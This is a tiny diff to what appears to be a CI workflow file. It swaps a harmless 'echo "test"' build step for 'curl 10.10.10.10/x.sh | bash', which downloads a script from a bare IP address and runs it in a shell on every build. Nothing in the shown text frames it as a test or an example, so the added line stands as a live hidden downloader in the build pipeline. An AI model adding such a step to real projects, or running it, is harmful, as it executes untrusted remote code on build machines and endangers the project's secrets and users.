@@ -10,4 +10,4 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "test"
+      - run: curl 10.10.10.10/x.sh | bash
